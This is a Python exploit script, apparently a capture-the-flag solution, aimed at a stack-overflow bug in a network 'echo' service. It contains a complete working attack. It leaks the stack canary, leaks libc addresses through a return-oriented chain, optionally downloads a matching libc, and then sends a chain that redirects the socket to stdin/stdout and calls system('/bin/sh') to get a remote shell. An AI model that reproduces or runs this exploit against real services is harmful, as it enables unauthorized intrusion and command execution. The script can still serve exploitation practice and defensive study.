#!/usr/bin/env python
from sc_pwn import *

env = Environment('local', 'remote')
env.set_item('target',  local   = {'host':'192.168.75.133','port':8080}, \
                        remote  = {'host':'target.com','port':4296})
env.set_item('libc',    local   = 'libc-2.19.so', \
                        remote  = 'libc-2.19.so_remote')
env.select()

binf = ELF('echo', rop=True)

addr_plt_exit       = binf.plt('exit')
addr_plt_dprintf    = binf.plt('dprintf')
addr_got_main       = binf.got('__libc_start_main')

addr_pop2ret        = binf.ropgadget('pop','pop','ret')

FD_SOCKET           = 4

#==========
def attack(cmn):
    #cmn.set_show('HEXDUMP')
    libc_exist = os.path.isfile(env.libc)
    
    canary                              = detect_canary()
    addr_libc_main, addr_libc_fprintf   = detect_libcaddr(canary)
    
    if env.check('remote') and not libc_exist:
        libcdb = libcDB(__libc_start_main=addr_libc_main, fprintf=addr_libc_fprintf)
        
        if raw_input('Download libc? (Y/N)').lower()=='y':
            libcdb.download(env.libc)
            libc_exist = os.path.isfile(env.libc)
        else:
            addr_libc_base      = addr_libc_main - libcdb.symbol('__libc_start_main')
            info('addr_libc_base        = 0x%08x' % addr_libc_base)
            addr_libc_dup2      = addr_libc_base + libcdb.symbol('dup2')
            addr_libc_system    = addr_libc_base + libcdb.symbol('system')
            addr_libc_str_sh    = addr_libc_base + libcdb.string('/bin/sh')
            
    if libc_exist:
        libc = ELF(env.libc)
        libc.set_location('__libc_start_main', addr_libc_main)
        addr_libc_dup2      = libc.function('dup2')
        addr_libc_system    = libc.function('system')
        addr_libc_str_sh    = libc.search('/bin/sh')

    info('addr_libc_system      = 0x%08x' % addr_libc_system)
    
    exploit  = 'a'*0x200
    exploit += pack_32(canary)
    exploit += pack_32(0xdeadbeef)*0x3
    exploit += pack_32(addr_libc_dup2)
    exploit += pack_32(addr_pop2ret)
    exploit += pack_32(FD_SOCKET)
    exploit += pack_32(STDIN_FILENO)
    exploit += pack_32(addr_libc_dup2)
    exploit += pack_32(addr_pop2ret)
    exploit += pack_32(FD_SOCKET)
    exploit += pack_32(STDOUT_FILENO)
    exploit += pack_32(addr_libc_system)
    exploit += pack_32(addr_plt_exit)
    exploit += pack_32(addr_libc_str_sh)
    cmn.read_until('>>')
    cmn.send(exploit)
    
def detect_canary():
    c = Communicate(env.target,mode='SOCKET', disp=False)

    c.read_until('>>')
    c.send('a'*0x200+'!')
    c.read_until('bytes\n')

    c.read_until('a!')
    canary = unpack_32('\x00'+c.read(3))
    info('canary    = 0x%08x' % canary)
    
    del(c)
    return canary

def detect_libcaddr(canary):
    c = Communicate(env.target,mode='SOCKET', disp=False)

    exploit  = 'a'*0x200
    exploit += pack_32(canary)
    exploit += pack_32(0xdeadbeef)*0x3
    exploit += pack_32(addr_plt_dprintf)
    exploit += pack_32(addr_plt_exit)
    exploit += pack_32(FD_SOCKET)
    exploit += pack_32(addr_got_main)
    c.read_until('>>')
    c.send(exploit)
    
    c.read_until('a\n')
    addr_libc_main      = unpack_32(c.read(4))
    addr_libc_fprintf   = unpack_32(c.read(4))
    
    return addr_libc_main, addr_libc_fprintf

#==========

if __name__=='__main__':
    cmn = Communicate(env.target,mode='SOCKET')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
